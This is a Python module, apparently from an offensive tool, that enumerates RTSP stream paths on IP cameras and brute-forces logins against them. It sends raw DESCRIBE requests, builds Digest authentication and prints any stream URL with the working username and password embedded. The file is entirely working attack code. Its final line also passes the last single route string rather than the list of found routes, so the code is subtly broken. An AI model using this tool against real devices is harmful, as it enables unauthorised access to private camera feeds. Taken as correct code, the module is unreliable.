import socket, os, json
from . import attack_routes as ar
from . import auth_helper as ah
from colorama import init
from termcolor import colored
from urllib.parse import urljoin, urlparse
from . import getauthenticationmethod as getAUTH
#urljoin(url, urlparse(url).path)

init()

def attack_creds_after_routes(target, port, authmethod, urlList):
    seq = 1 # Starting sequence number

    # Loading the credentials
    with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
        userpasslist = json.load(f)

    # For each route, for each user/pass combination
    for url in urlList:
        for username in userpasslist['usernames']:
            for password in userpasslist['passwords']:
                try:
                    recBuffer = "" # Empty receive buffer for DIGEST

                    # Format the URL to be described
                    describeURL = "rtsp://{}:{}/{}".format(target, port, url)
                    # Change "invalidusername" and "invalidpassword" with the current ones
                    describeURL = describeURL.replace("invalidusername", username).replace("invalidpassword", password)

                    # Connecting in a loop to avoid disconnects on some devices that do not respect RFC
                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((target,port))

                    if authmethod == "digest": # If it's a DIGEST Auth target
                        # Describe blindly first, to get nonce and realm
                        s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                        recBuffer = s.recv(ah.configJson["bufLen"]).decode()
                        seq += 1 # Increase sequence

                    # Describe the correct way this time
                    s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, recBuffer, username, password, "/{}".format(url))))
                    finalBuffer = s.recv(ah.configJson["bufLen"]).decode()
                    seq += 1# Increase sequence

                    if "RTSP/1.0 200" in finalBuffer: # If we get a 200 response, we found valid creds
                        print(colored("[+] Found Stream: {}".format(describeURL.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
                except:
                    pass

def findValidRoutes(target, port):
    seq = 1 # Starting sequence
    authmethod = "" # Blank Auth Method (will be filled later)
    foundRoutes = [] # List with valid routes

    for route in ar.routeBuilder("invalidusername", "invalidpassword"):
        try:
            # Connecting in a loop to avoid disconnects on some devices that do not respect RFC
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target,port))

            # Getting our URL ready to be described
            describeURL = "rtsp://{}:{}/{}".format(target, port, route)

            # Describing the URL
            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
            finalBuffer = s.recv(ah.configJson["bufLen"]).decode()
            seq += 1 # Increasing sequence

            # If 401 or 403 as a response - we probably found a valid route
            if "RTSP/1.0 401" in finalBuffer or "RTSP/1.0 403" in finalBuffer:
                if authmethod == "": # Detect AUTH method, at the first found route (the rest should have the same auth method)
                    authmethod = getAUTH.detect_auth(target, port)
                if route not in foundRoutes: # If it's the first time we see this route (iSpy's XML has duplicates)
                    foundRoutes.append(route) # Add it to the list of found routes
        except:
            pass
    if len(foundRoutes) > 0:
        attack_creds_after_routes(target, port, authmethod, route)
